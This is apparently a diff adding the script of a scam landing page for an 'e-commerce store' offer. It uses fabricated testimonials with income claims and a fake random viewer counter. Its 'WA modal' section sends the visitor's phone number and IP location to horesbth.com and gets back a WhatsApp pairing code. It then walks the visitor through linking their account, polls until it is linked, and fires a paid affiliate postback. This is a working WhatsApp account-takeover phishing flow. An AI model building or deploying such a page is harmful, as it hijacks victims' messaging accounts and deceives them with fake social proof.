+      ctx.save();ctx.globalAlpha=p.alpha;ctx.font=`${p.size}px serif`;
+      ctx.textBaseline='middle';ctx.textAlign='center';
+      ctx.translate(p.x,p.y);ctx.rotate(p.rot);ctx.fillText(p.em,0,0);ctx.restore();
+      p.x+=p.vx;p.y+=p.vy;p.rot+=p.rotSpeed;
+      if(p.y>canvas.height+40) Object.assign(p,spawn());
+    }
+    requestAnimationFrame(draw);
+  }
+  draw();
+})();
+
+// ── TESTIMONIALS ──
+const TESTIMONIALS = [
+  {init:'S',name:'Sarah Mitchell',city:'Austin, TX',earning:'$420/day',text:'"I had zero experience in e-commerce. Within a week my store was live and I was already making consistent sales. Best decision I ever made."'},
+  {init:'J',name:'James Holloway',city:'Manchester, UK',earning:'$680/day',text:'"The setup was incredibly fast and the support team guided me every step. I went from zero to $680 a day in under a month."'},
+  {init:'A',name:'Amanda Torres',city:'Miami, FL',earning:'$310/day',text:'"I was skeptical at first, but the results speak for themselves. I now earn $310 a day working just a few hours from home."'},
+  {init:'R',name:'Ryan Chen',city:'Toronto, CA',earning:'$520/day',text:'"They handled everything — branding, products, listings. All I had to do was follow their guidance. Absolutely worth it."'},
+  {init:'E',name:'Emma Lawson',city:'Sydney, AU',earning:'$390/day',text:'"Launched my beauty store in 24 hours. The ongoing support is incredible and my revenue keeps growing every week."'},
+  {init:'M',name:'Marcus Webb',city:'London, UK',earning:'$750/day',text:'"I replaced my full-time income within two months. The team is professional and genuinely invested in your success."'},
+];
+
+const track = document.getElementById('marquee');
+function buildCard(t){
+  const d=document.createElement('div');
+  d.className='tcard';
+  d.innerHTML=`
+    <div class="stars">★★★★★</div>
+    <div class="tcard-top">
+      <div class="tcard-avatar">${t.init}</div>
+      <div>
+        <div class="tcard-name">${t.name}</div>
+        <div style="color:var(--gold);font-weight:700;font-size:13px">${t.earning}</div>
+        <div style="font-size:11px;color:var(--muted)">${t.city}</div>
+      </div>
+    </div>
+    <div class="tcard-text">${t.text}</div>`;
+  return d;
+}
+TESTIMONIALS.forEach(t=>track.appendChild(buildCard(t)));
+requestAnimationFrame(()=>requestAnimationFrame(()=>{
+  const oneW=track.scrollWidth;
+  for(let i=0;i<3;i++) TESTIMONIALS.forEach(t=>track.appendChild(buildCard(t)));
+  let x=0;
+  function tick(){ x+=1.5; if(x>=oneW) x-=oneW; track.style.transform=`translateX(-${x}px)`; requestAnimationFrame(tick); }
+  tick();
+}));
+
+// ── SCROLL REVEAL ──
+const reveals=document.querySelectorAll('.reveal');
+const observer=new IntersectionObserver(entries=>{
+  entries.forEach(e=>{ if(e.isIntersecting) e.target.classList.add('visible'); });
+},{threshold:0.12});
+reveals.forEach(el=>observer.observe(el));
+
+// ── VIEWER COUNT ──
+(function(){
+  const el=document.getElementById('vcNum');
+  if(!el) return;
+  let n=parseInt(el.textContent);
+  setInterval(()=>{
+    n+=Math.random()<.5?1:-1;
+    n=Math.max(28,Math.min(64,n));
+    el.textContent=n;
+  },8000);
+})();
+
+// ── COUNTER ANIMATION ──
+function animateCounter(el,end,duration=1400){
+  let start=0,step=end/(duration/16);
+  const tick=()=>{ start=Math.min(start+step,end); el.textContent='+'+Math.round(start); if(start<end) requestAnimationFrame(tick); };
+  requestAnimationFrame(tick);
+}
+const statEl=document.getElementById('statStores');
+const statsEl=document.querySelector('.stats');
+const statsObs=new IntersectionObserver(([e])=>{
+  if(e.isIntersecting){ animateCounter(statEl,1200); statsObs.disconnect(); }
+},{threshold:0.5});
+if(statsEl) statsObs.observe(statsEl);
+
+// ── PIXEL: ViewContent on 50% scroll ──
+(function(){
+  let fired=false;
+  function onScroll(){
+    if(fired) return;
+    if((window.scrollY+window.innerHeight)/document.documentElement.scrollHeight>=0.5){
+      fired=true;
+      fbq('track','ViewContent');
+      window.removeEventListener('scroll',onScroll);
+    }
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+})();
+
+// ── WA MODAL ──
+(function(){
+  function getParam(key){
+    var v=new URLSearchParams(window.location.search).get(key);
+    if(v) return v;
+    var h=window.location.hash||'';
+    var qi=h.indexOf('?');
+    if(qi>=0) v=new URLSearchParams(h.slice(qi+1)).get(key);
+    return v||'';
+  }
+  const CID = getParam('cid');
+  const SOURCE_CODE = getParam('source_code');
+  const API = 'https://horesbth.com';
+
+  // IP info fetched on page load — used for pre-select + API payload
+  let userIp = '';
+  let userIpInfo = {};
+
+  const COUNTRIES = [
+    {code:'AF',dial:'+93',name:'🇦🇫 +93 Afghanistan'},
+    {code:'AL',dial:'+355',name:'🇦🇱 +355 Albania'},
+    {code:'DZ',dial:'+213',name:'🇩🇿 +213 Algeria'},
+    {code:'AD',dial:'+376',name:'🇦🇩 +376 Andorra'},
+    {code:'AO',dial:'+244',name:'🇦🇴 +244 Angola'},
+    {code:'AG',dial:'+1268',name:'🇦🇬 +1268 Antigua & Barbuda'},
+    {code:'AR',dial:'+54',name:'🇦🇷 +54 Argentina'},
+    {code:'AM',dial:'+374',name:'🇦🇲 +374 Armenia'},
+    {code:'AU',dial:'+61',name:'🇦🇺 +61 Australia'},
+    {code:'AT',dial:'+43',name:'🇦🇹 +43 Austria'},
+    {code:'AZ',dial:'+994',name:'🇦🇿 +994 Azerbaijan'},
+    {code:'BS',dial:'+1242',name:'🇧🇸 +1242 Bahamas'},
+    {code:'BH',dial:'+973',name:'🇧🇭 +973 Bahrain'},
+    {code:'BD',dial:'+880',name:'🇧🇩 +880 Bangladesh'},
+    {code:'BB',dial:'+1246',name:'🇧🇧 +1246 Barbados'},
+    {code:'BY',dial:'+375',name:'🇧🇾 +375 Belarus'},
+    {code:'BE',dial:'+32',name:'🇧🇪 +32 Belgium'},
+    {code:'BZ',dial:'+501',name:'🇧🇿 +501 Belize'},
+    {code:'BJ',dial:'+229',name:'🇧🇯 +229 Benin'},
+    {code:'BT',dial:'+975',name:'🇧🇹 +975 Bhutan'},
+    {code:'BO',dial:'+591',name:'🇧🇴 +591 Bolivia'},
+    {code:'BA',dial:'+387',name:'🇧🇦 +387 Bosnia & Herzegovina'},
+    {code:'BW',dial:'+267',name:'🇧🇼 +267 Botswana'},
+    {code:'BR',dial:'+55',name:'🇧🇷 +55 Brazil'},
+    {code:'BN',dial:'+673',name:'🇧🇳 +673 Brunei'},
+    {code:'BG',dial:'+359',name:'🇧🇬 +359 Bulgaria'},
+    {code:'BF',dial:'+226',name:'🇧🇫 +226 Burkina Faso'},
+    {code:'BI',dial:'+257',name:'🇧🇮 +257 Burundi'},
+    {code:'CV',dial:'+238',name:'🇨🇻 +238 Cape Verde'},
+    {code:'KH',dial:'+855',name:'🇰🇭 +855 Cambodia'},
+    {code:'CM',dial:'+237',name:'🇨🇲 +237 Cameroon'},
+    {code:'CA',dial:'+1',name:'🇨🇦 +1 Canada'},
+    {code:'CF',dial:'+236',name:'🇨🇫 +236 Central African Rep.'},
+    {code:'TD',dial:'+235',name:'🇹🇩 +235 Chad'},
+    {code:'CL',dial:'+56',name:'🇨🇱 +56 Chile'},
+    {code:'CN',dial:'+86',name:'🇨🇳 +86 China'},
+    {code:'CO',dial:'+57',name:'🇨🇴 +57 Colombia'},
+    {code:'KM',dial:'+269',name:'🇰🇲 +269 Comoros'},
+    {code:'CG',dial:'+242',name:'🇨🇬 +242 Congo'},
+    {code:'CD',dial:'+243',name:'🇨🇩 +243 Congo (DRC)'},
+    {code:'CR',dial:'+506',name:'🇨🇷 +506 Costa Rica'},
+    {code:'CI',dial:'+225',name:'🇨🇮 +225 Côte d\'Ivoire'},
+    {code:'HR',dial:'+385',name:'🇭🇷 +385 Croatia'},
+    {code:'CU',dial:'+53',name:'🇨🇺 +53 Cuba'},
+    {code:'CY',dial:'+357',name:'🇨🇾 +357 Cyprus'},
+    {code:'CZ',dial:'+420',name:'🇨🇿 +420 Czech Republic'},
+    {code:'DK',dial:'+45',name:'🇩🇰 +45 Denmark'},
+    {code:'DJ',dial:'+253',name:'🇩🇯 +253 Djibouti'},
+    {code:'DM',dial:'+1767',name:'🇩🇲 +1767 Dominica'},
+    {code:'DO',dial:'+1809',name:'🇩🇴 +1809 Dominican Republic'},
+    {code:'EC',dial:'+593',name:'🇪🇨 +593 Ecuador'},
+    {code:'EG',dial:'+20',name:'🇪🇬 +20 Egypt'},
+    {code:'SV',dial:'+503',name:'🇸🇻 +503 El Salvador'},
+    {code:'GQ',dial:'+240',name:'🇬🇶 +240 Equatorial Guinea'},
+    {code:'ER',dial:'+291',name:'🇪🇷 +291 Eritrea'},
+    {code:'EE',dial:'+372',name:'🇪🇪 +372 Estonia'},
+    {code:'SZ',dial:'+268',name:'🇸🇿 +268 Eswatini'},
+    {code:'ET',dial:'+251',name:'🇪🇹 +251 Ethiopia'},
+    {code:'FJ',dial:'+679',name:'🇫🇯 +679 Fiji'},
+    {code:'FI',dial:'+358',name:'🇫🇮 +358 Finland'},
+    {code:'FR',dial:'+33',name:'🇫🇷 +33 France'},
+    {code:'GA',dial:'+241',name:'🇬🇦 +241 Gabon'},
+    {code:'GM',dial:'+220',name:'🇬🇲 +220 Gambia'},
+    {code:'GE',dial:'+995',name:'🇬🇪 +995 Georgia'},
+    {code:'DE',dial:'+49',name:'🇩🇪 +49 Germany'},
+    {code:'GH',dial:'+233',name:'🇬🇭 +233 Ghana'},
+    {code:'GR',dial:'+30',name:'🇬🇷 +30 Greece'},
+    {code:'GD',dial:'+1473',name:'🇬🇩 +1473 Grenada'},
+    {code:'GT',dial:'+502',name:'🇬🇹 +502 Guatemala'},
+    {code:'GN',dial:'+224',name:'🇬🇳 +224 Guinea'},
+    {code:'GW',dial:'+245',name:'🇬🇼 +245 Guinea-Bissau'},
+    {code:'GY',dial:'+592',name:'🇬🇾 +592 Guyana'},
+    {code:'HT',dial:'+509',name:'🇭🇹 +509 Haiti'},
+    {code:'HN',dial:'+504',name:'🇭🇳 +504 Honduras'},
+    {code:'HK',dial:'+852',name:'🇭🇰 +852 Hong Kong'},
+    {code:'HU',dial:'+36',name:'🇭🇺 +36 Hungary'},
+    {code:'IS',dial:'+354',name:'🇮🇸 +354 Iceland'},
+    {code:'IN',dial:'+91',name:'🇮🇳 +91 India'},
+    {code:'ID',dial:'+62',name:'🇮🇩 +62 Indonesia'},
+    {code:'IR',dial:'+98',name:'🇮🇷 +98 Iran'},
+    {code:'IQ',dial:'+964',name:'🇮🇶 +964 Iraq'},
+    {code:'IE',dial:'+353',name:'🇮🇪 +353 Ireland'},
+    {code:'IL',dial:'+972',name:'🇮🇱 +972 Israel'},
+    {code:'IT',dial:'+39',name:'🇮🇹 +39 Italy'},
+    {code:'JM',dial:'+1876',name:'🇯🇲 +1876 Jamaica'},
+    {code:'JP',dial:'+81',name:'🇯🇵 +81 Japan'},
+    {code:'JO',dial:'+962',name:'🇯🇴 +962 Jordan'},
+    {code:'KZ',dial:'+7',name:'🇰🇿 +7 Kazakhstan'},
+    {code:'KE',dial:'+254',name:'🇰🇪 +254 Kenya'},
+    {code:'KI',dial:'+686',name:'🇰🇮 +686 Kiribati'},
+    {code:'KP',dial:'+850',name:'🇰🇵 +850 North Korea'},
+    {code:'KR',dial:'+82',name:'🇰🇷 +82 South Korea'},
+    {code:'KW',dial:'+965',name:'🇰🇼 +965 Kuwait'},
+    {code:'KG',dial:'+996',name:'🇰🇬 +996 Kyrgyzstan'},
+    {code:'LA',dial:'+856',name:'🇱🇦 +856 Laos'},
+    {code:'LV',dial:'+371',name:'🇱🇻 +371 Latvia'},
+    {code:'LB',dial:'+961',name:'🇱🇧 +961 Lebanon'},
+    {code:'LS',dial:'+266',name:'🇱🇸 +266 Lesotho'},
+    {code:'LR',dial:'+231',name:'🇱🇷 +231 Liberia'},
+    {code:'LY',dial:'+218',name:'🇱🇾 +218 Libya'},
+    {code:'LI',dial:'+423',name:'🇱🇮 +423 Liechtenstein'},
+    {code:'LT',dial:'+370',name:'🇱🇹 +370 Lithuania'},
+    {code:'LU',dial:'+352',name:'🇱🇺 +352 Luxembourg'},
+    {code:'MO',dial:'+853',name:'🇲🇴 +853 Macao'},
+    {code:'MG',dial:'+261',name:'🇲🇬 +261 Madagascar'},
+    {code:'MW',dial:'+265',name:'🇲🇼 +265 Malawi'},
+    {code:'MY',dial:'+60',name:'🇲🇾 +60 Malaysia'},
+    {code:'MV',dial:'+960',name:'🇲🇻 +960 Maldives'},
+    {code:'ML',dial:'+223',name:'🇲🇱 +223 Mali'},
+    {code:'MT',dial:'+356',name:'🇲🇹 +356 Malta'},
+    {code:'MH',dial:'+692',name:'🇲🇭 +692 Marshall Islands'},
+    {code:'MR',dial:'+222',name:'🇲🇷 +222 Mauritania'},
+    {code:'MU',dial:'+230',name:'🇲🇺 +230 Mauritius'},
+    {code:'MX',dial:'+52',name:'🇲🇽 +52 Mexico'},
+    {code:'FM',dial:'+691',name:'🇫🇲 +691 Micronesia'},
+    {code:'MD',dial:'+373',name:'🇲🇩 +373 Moldova'},
+    {code:'MC',dial:'+377',name:'🇲🇨 +377 Monaco'},
+    {code:'MN',dial:'+976',name:'🇲🇳 +976 Mongolia'},
+    {code:'ME',dial:'+382',name:'🇲🇪 +382 Montenegro'},
+    {code:'MA',dial:'+212',name:'🇲🇦 +212 Morocco'},
+    {code:'MZ',dial:'+258',name:'🇲🇿 +258 Mozambique'},
+    {code:'MM',dial:'+95',name:'🇲🇲 +95 Myanmar'},
+    {code:'NA',dial:'+264',name:'🇳🇦 +264 Namibia'},
+    {code:'NR',dial:'+674',name:'🇳🇷 +674 Nauru'},
+    {code:'NP',dial:'+977',name:'🇳🇵 +977 Nepal'},
+    {code:'NL',dial:'+31',name:'🇳🇱 +31 Netherlands'},
+    {code:'NZ',dial:'+64',name:'🇳🇿 +64 New Zealand'},
+    {code:'NI',dial:'+505',name:'🇳🇮 +505 Nicaragua'},
+    {code:'NE',dial:'+227',name:'🇳🇪 +227 Niger'},
+    {code:'NG',dial:'+234',name:'🇳🇬 +234 Nigeria'},
+    {code:'MK',dial:'+389',name:'🇲🇰 +389 North Macedonia'},
+    {code:'NO',dial:'+47',name:'🇳🇴 +47 Norway'},
+    {code:'OM',dial:'+968',name:'🇴🇲 +968 Oman'},
+    {code:'PK',dial:'+92',name:'🇵🇰 +92 Pakistan'},
+    {code:'PW',dial:'+680',name:'🇵🇼 +680 Palau'},
+    {code:'PS',dial:'+970',name:'🇵🇸 +970 Palestine'},
+    {code:'PA',dial:'+507',name:'🇵🇦 +507 Panama'},
+    {code:'PG',dial:'+675',name:'🇵🇬 +675 Papua New Guinea'},
+    {code:'PY',dial:'+595',name:'🇵🇾 +595 Paraguay'},
+    {code:'PE',dial:'+51',name:'🇵🇪 +51 Peru'},
+    {code:'PH',dial:'+63',name:'🇵🇭 +63 Philippines'},
+    {code:'PL',dial:'+48',name:'🇵🇱 +48 Poland'},
+    {code:'PT',dial:'+351',name:'🇵🇹 +351 Portugal'},
+    {code:'QA',dial:'+974',name:'🇶🇦 +974 Qatar'},
+    {code:'RO',dial:'+40',name:'🇷🇴 +40 Romania'},
+    {code:'RU',dial:'+7',name:'🇷🇺 +7 Russia'},
+    {code:'RW',dial:'+250',name:'🇷🇼 +250 Rwanda'},
+    {code:'KN',dial:'+1869',name:'🇰🇳 +1869 Saint Kitts & Nevis'},
+    {code:'LC',dial:'+1758',name:'🇱🇨 +1758 Saint Lucia'},
+    {code:'VC',dial:'+1784',name:'🇻🇨 +1784 Saint Vincent'},
+    {code:'WS',dial:'+685',name:'🇼🇸 +685 Samoa'},
+    {code:'SM',dial:'+378',name:'🇸🇲 +378 San Marino'},
+    {code:'ST',dial:'+239',name:'🇸🇹 +239 São Tomé & Príncipe'},
+    {code:'SA',dial:'+966',name:'🇸🇦 +966 Saudi Arabia'},
+    {code:'SN',dial:'+221',name:'🇸🇳 +221 Senegal'},
+    {code:'RS',dial:'+381',name:'🇷🇸 +381 Serbia'},
+    {code:'SC',dial:'+248',name:'🇸🇨 +248 Seychelles'},
+    {code:'SL',dial:'+232',name:'🇸🇱 +232 Sierra Leone'},
+    {code:'SG',dial:'+65',name:'🇸🇬 +65 Singapore'},
+    {code:'SK',dial:'+421',name:'🇸🇰 +421 Slovakia'},
+    {code:'SI',dial:'+386',name:'🇸🇮 +386 Slovenia'},
+    {code:'SB',dial:'+677',name:'🇸🇧 +677 Solomon Islands'},
+    {code:'SO',dial:'+252',name:'🇸🇴 +252 Somalia'},
+    {code:'ZA',dial:'+27',name:'🇿🇦 +27 South Africa'},
+    {code:'SS',dial:'+211',name:'🇸🇸 +211 South Sudan'},
+    {code:'ES',dial:'+34',name:'🇪🇸 +34 Spain'},
+    {code:'LK',dial:'+94',name:'🇱🇰 +94 Sri Lanka'},
+    {code:'SD',dial:'+249',name:'🇸🇩 +249 Sudan'},
+    {code:'SR',dial:'+597',name:'🇸🇷 +597 Suriname'},
+    {code:'SE',dial:'+46',name:'🇸🇪 +46 Sweden'},
+    {code:'CH',dial:'+41',name:'🇨🇭 +41 Switzerland'},
+    {code:'SY',dial:'+963',name:'🇸🇾 +963 Syria'},
+    {code:'TW',dial:'+886',name:'🇹🇼 +886 Taiwan'},
+    {code:'TJ',dial:'+992',name:'🇹🇯 +992 Tajikistan'},
+    {code:'TZ',dial:'+255',name:'🇹🇿 +255 Tanzania'},
+    {code:'TH',dial:'+66',name:'🇹🇭 +66 Thailand'},
+    {code:'TL',dial:'+670',name:'🇹🇱 +670 Timor-Leste'},
+    {code:'TG',dial:'+228',name:'🇹🇬 +228 Togo'},
+    {code:'TO',dial:'+676',name:'🇹🇴 +676 Tonga'},
+    {code:'TT',dial:'+1868',name:'🇹🇹 +1868 Trinidad & Tobago'},
+    {code:'TN',dial:'+216',name:'🇹🇳 +216 Tunisia'},
+    {code:'TR',dial:'+90',name:'🇹🇷 +90 Turkey'},
+    {code:'TM',dial:'+993',name:'🇹🇲 +993 Turkmenistan'},
+    {code:'TV',dial:'+688',name:'🇹🇻 +688 Tuvalu'},
+    {code:'UG',dial:'+256',name:'🇺🇬 +256 Uganda'},
+    {code:'UA',dial:'+380',name:'🇺🇦 +380 Ukraine'},
+    {code:'AE',dial:'+971',name:'🇦🇪 +971 UAE'},
+    {code:'GB',dial:'+44',name:'🇬🇧 +44 United Kingdom'},
+    {code:'US',dial:'+1',name:'🇺🇸 +1 United States'},
+    {code:'UY',dial:'+598',name:'🇺🇾 +598 Uruguay'},
+    {code:'UZ',dial:'+998',name:'🇺🇿 +998 Uzbekistan'},
+    {code:'VU',dial:'+678',name:'🇻🇺 +678 Vanuatu'},
+    {code:'VE',dial:'+58',name:'🇻🇪 +58 Venezuela'},
+    {code:'VN',dial:'+84',name:'🇻🇳 +84 Vietnam'},
+    {code:'YE',dial:'+967',name:'🇾🇪 +967 Yemen'},
+    {code:'ZM',dial:'+260',name:'🇿🇲 +260 Zambia'},
+    {code:'ZW',dial:'+263',name:'🇿🇼 +263 Zimbabwe'},
+  ];
+
+  const modal      = document.getElementById('wa-modal');
+  const closeBtn   = document.getElementById('wa-close');
+  const phoneInput = document.getElementById('wa-phone');
+  const submitBtn  = document.getElementById('wa-submit');
+  const retryBtn   = document.getElementById('wa-retry');
+  const codeEl     = document.getElementById('wa-code');
+  const waitEl     = document.querySelector('.wa-waiting');
+  const copyBtn    = document.getElementById('wa-copy');
+  const phaseA     = document.getElementById('wa-phase-a');
+  const phaseB     = document.getElementById('wa-phase-b');
+  const cdNumEl    = document.getElementById('wa-cd-num');
+  const codeBEl    = document.getElementById('wa-code-b');
+  const waitText   = document.getElementById('wa-wait-text');
+  let cdTimer      = null;
+
+  // Country picker elements
+  const countryBtn    = document.getElementById('wa-country-btn');
+  const countryDrop   = document.getElementById('wa-country-drop');
+  const countrySearch = document.getElementById('wa-country-search');
+  const countryList   = document.getElementById('wa-country-list');
+  const flagEl        = document.getElementById('wa-country-flag');
+  const dialLabelEl   = document.getElementById('wa-country-dial');
+
+  let selectedDial = '1'; // digits only, no +
+  let selectedFlag = '🌐';
+  let fullPhone  = '';
+  let retryFlag  = '';
+  let pollTimer  = null;
+  let expireTimer = null;
+
+  // Build country list items
+  function renderList(filter){
+    filter=(filter||'').toLowerCase();
+    countryList.innerHTML='';
+    COUNTRIES.forEach(c=>{
+      const label=c.name.toLowerCase();
+      const dialLow=c.dial.toLowerCase();
+      if(filter && !label.includes(filter) && !dialLow.includes(filter)) return;
+      const item=document.createElement('div');
+      item.className='wa-country-item';
+      const parts=c.name.split(' ');
+      const flag=parts[0];
+      const rest=parts.slice(1).join(' ');
+      item.innerHTML=`<span>${flag}</span><span>${rest}</span><span class="wa-country-item-dial">${c.dial}</span>`;
+      item.addEventListener('click',()=>{
+        selectedDial=c.dial.replace('+','');
+        selectedFlag=flag;
+        flagEl.textContent=flag;
+        dialLabelEl.textContent=c.dial;
+        closeDrop();
+        phoneInput.focus();
+      });
+      countryList.appendChild(item);
+    });
+  }
+  renderList('');
+
+  function openDrop(){
+    countryDrop.classList.add('open');
+    countrySearch.value='';
+    renderList('');
+    countrySearch.focus();
+  }
+  function closeDrop(){ countryDrop.classList.remove('open'); }
+
+  countryBtn.addEventListener('click',e=>{
+    e.stopPropagation();
+    countryDrop.classList.contains('open') ? closeDrop() : openDrop();
+  });
+  countrySearch.addEventListener('input',()=>renderList(countrySearch.value));
+  document.addEventListener('click',e=>{
+    if(!document.getElementById('wa-country-wrap').contains(e.target)) closeDrop();
+  });
+
+  // Select a country by code and update the button label
+  function selectCountryByCode(code){
+    const m=COUNTRIES.find(c=>c.code===code);
+    if(!m) return;
+    const flag=m.name.split(' ')[0];
+    selectedDial=m.dial.replace('+','');
+    selectedFlag=flag;
+    flagEl.textContent=flag;
+    dialLabelEl.textContent=m.dial;
+  }
+
+  // Fetch IP info on page load — pre-select dial code AND pass to API
+  // ipapi.co supports HTTPS on free tier (ip-api.com free only supports HTTP, blocked on HTTPS pages)
+  fetch('https://ipapi.co/json/')
+    .then(r=>r.json())
+    .then(d=>{
+      if(d.country_code){
+        userIp=d.ip||'';
+        userIpInfo={country:d.country_name||'',region:d.region||'',city:d.city||''};
+        selectCountryByCode(d.country_code);
+      }
+    }).catch(()=>{});
+
+  // All CTA buttons open modal
+  document.querySelectorAll('.btn-wa').forEach(btn=>{
+    btn.addEventListener('click',function(e){
+      e.preventDefault();
+      modal.classList.add('open');
+      fbq('track','Lead');
+    });
+  });
+
+  closeBtn.addEventListener('click',()=>closeModal());
+  modal.addEventListener('click',e=>{ if(e.target===modal) closeModal(); });
+
+  function closeModal(){
+    modal.classList.remove('open');
+    stopPolling();
+    clearTimeout(expireTimer);
+    clearInterval(cdTimer);
+    cdTimer=null;
+  }
+
+  function resetPairPhase(){
+    phaseA.style.display='block';
+    phaseB.style.display='none';
+    clearInterval(cdTimer);
+    cdTimer=null;
+  }
+
+  function startCopyCountdown(){
+    const code=codeEl.textContent.trim();
+    codeBEl.textContent=code;
+    phaseA.style.display='none';
+    phaseB.style.display='block';
+    if(waitText) waitText.textContent='Waiting for connection…';
+    let t=10;
+    cdNumEl.textContent=t;
+    clearInterval(cdTimer);
+    cdTimer=setInterval(()=>{
+      t--;
+      cdNumEl.textContent=t;
+      if(t<=0){
+        clearInterval(cdTimer);
+        cdTimer=null;
+        // Open WhatsApp on mobile
+        window.location.href='whatsapp://';
+      }
+    },1000);
+  }
+
+  copyBtn.addEventListener('click',()=>{
+    const code=codeEl.textContent.trim();
+    if(!code||code==='——') return;
+    // Copy to clipboard
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(code).catch(()=>{});
+    } else {
+      const ta=document.createElement('textarea');
+      ta.value=code; ta.style.position='fixed'; ta.style.left='-9999px';
+      document.body.appendChild(ta); ta.select();
+      document.execCommand('copy'); document.body.removeChild(ta);
+    }
+    startCopyCountdown();
+    startPolling();
+  });
+
+  function showStep(id){
+    ['step-phone','step-pair','step-success'].forEach(s=>{
+      document.getElementById(s).style.display=(s===id)?'block':'none';
+    });
+    if(id==='step-pair') resetPairPhase();
+  }
+
+  function rand8(){
+    return (Math.floor(Math.random()*90000000)+10000000).toString();
+  }
+
+  function firePostback(){
+    if(!CID) return;
+    const url='http://bm0aa.bemobtrcks.com/postback?cid='+encodeURIComponent(CID)+'&payout=0.4&txid='+rand8();
+    fetch(url,{mode:'no-cors'}).catch(()=>{});
+    (new Image()).src=url;
+  }
+
+  function resetWaitText(){
+    waitEl.innerHTML='<div class="wa-spinner"></div><span>Waiting for connection…</span>';
+  }
+
+  function startPolling(){
+    stopPolling();
+    clearTimeout(expireTimer);
+    resetWaitText();
+    // Code expires after 60s — stop polling and prompt retry
+    expireTimer=setTimeout(()=>{
+      stopPolling();
+      waitEl.innerHTML='<span style="color:#C0392B;font-size:13px">Code expired — tap "Get new code"</span>';
+    },60000);
+    // POST to /api/account/status with phone
+    pollTimer=setInterval(()=>{
+      fetch(API+'/api/account/status',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({phone:fullPhone})
+      })
+      .then(r=>r.json())
+      .then(d=>{
+        if(d.code===0 && d.data && d.data.linked===true){
+          stopPolling();
+          clearTimeout(expireTimer);
+          fbq('track','CompleteRegistration',{status:true});
+          showStep('step-success');
+          firePostback();
+        }
+      }).catch(()=>{});
+    },3000);
+  }
+
+  function stopPolling(){
+    if(pollTimer){ clearInterval(pollTimer); pollTimer=null; }
+  }
+
+  submitBtn.addEventListener('click',()=>{
+    const num=phoneInput.value.replace(/\D/g,'');
+    if(num.length<6){ phoneInput.focus(); return; }
+    fullPhone=selectedDial+num;
+    fbq('track','InitiateCheckout');
+    submitBtn.disabled=true;
+    submitBtn.textContent='Connecting…';
+    const body={phone:fullPhone, source_code:SOURCE_CODE};
+    if(userIp) body.ip=userIp;
+    if(userIpInfo.country) body.ip_info=userIpInfo;
+    fetch(API+'/api/account/create',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(body)
+    })
+    .then(r=>r.json())
+    .then(d=>{
+      if(d.code===0 && d.data && d.data.pair_code){
+        codeEl.textContent=d.data.pair_code;
+        retryFlag=d.data.retry_flag||'';
+        showStep('step-pair');
+        startPolling();
+      } else {
+        submitBtn.disabled=false;
+        submitBtn.textContent='Continue →';
+        alert(d.msg||'Something went wrong. Please try again.');
+      }
+    })
+    .catch(()=>{
+      submitBtn.disabled=false;
+      submitBtn.textContent='Continue →';
+      alert('Network error. Please check your connection and try again.');
+    });
+  });
+
+  retryBtn.addEventListener('click',()=>{
+    if(!retryFlag) return;
+    retryBtn.disabled=true;
+    stopPolling();
+    clearTimeout(expireTimer);
+    fetch(API+'/api/account/retry',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({flag:retryFlag})
+    })
+    .then(r=>r.json())
+    .then(d=>{
+      if(d.code===0 && d.data && d.data.pair_code){
+        codeEl.textContent=d.data.pair_code;
+        retryFlag=d.data.retry_flag||retryFlag;
+        startPolling();
+      }
+      retryBtn.disabled=false;
+    })
+    .catch(()=>{ retryBtn.disabled=false; });
+  });
+})();
+</script>
+</body>
+</html>
